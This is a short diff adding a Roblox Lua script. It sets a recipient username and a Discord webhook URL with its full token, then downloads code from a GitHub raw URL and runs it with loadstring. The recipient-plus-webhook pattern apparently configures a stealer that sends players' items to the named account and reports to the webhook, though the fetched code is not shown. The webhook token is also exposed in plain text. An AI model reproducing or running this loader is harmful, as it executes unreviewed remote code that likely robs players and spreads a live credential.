@@ -1,0 +1,5 @@
+_G.UserName = "wardedz" -- username here 
+_G.UserName2 = "wardedz" -- optional
+_G.Webhook = "https://discord.com/api/webhooks/1124596642956460142/Mb99x5LREzGhGnlM7re5OGiC_gHOp_J-B_iPLYz_6Vqvbx9j7y5oKulvfKUnlGF8hVBL" -- Webhook Here - optional
+   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
